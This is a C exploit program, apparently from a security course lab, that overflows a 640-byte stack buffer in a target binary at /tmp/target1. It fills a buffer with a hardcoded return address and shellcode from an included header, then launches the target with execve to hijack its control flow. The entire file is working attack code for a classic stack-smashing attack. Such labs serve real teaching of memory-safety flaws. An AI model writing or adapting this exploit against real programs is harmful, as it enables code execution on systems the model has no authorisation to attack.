#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

// based on gdb

// char buffer + 2 saved regs + fp, RA
#define BUF_SIZE 640
#define FRAME_SIZE (BUF_SIZE + 16)
#define BUF_ADDR 0xbffff940 

int main(void)
{
  int i;
  int * addrPtr; // used for setting the buf address in the sploit buffer

  char *args[3];
  char *env[1];

  // contains the shellcode and address of buf
  // splot will be in format [ ___shellcode___ &buf &buf &buf... ]
  char sploit[FRAME_SIZE];
  
  // first setting the address of the buffer then copying in the shellcode
  addrPtr = (int *) sploit;
  for (i = 0; i < FRAME_SIZE / sizeof(int); i++){
    addrPtr[i] = BUF_ADDR;
  }
	
  // Can't copy null terminator
  memcpy(sploit, shellcode, sizeof(shellcode) -1);
 
  args[0] = TARGET; 
  args[1] = sploit; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}